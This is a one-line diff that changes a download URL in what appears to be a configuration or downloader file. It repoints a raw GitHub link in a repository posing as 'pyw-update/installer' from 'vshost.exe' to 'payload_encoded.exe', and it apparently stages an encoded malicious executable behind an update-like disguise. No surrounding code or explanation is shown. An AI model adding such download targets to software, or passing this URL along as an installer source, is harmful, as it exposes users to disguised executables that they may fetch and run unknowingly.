@@ -1,1 +1,1 @@
-https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/files/vshost.exe
+https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/files/payload_encoded.exe
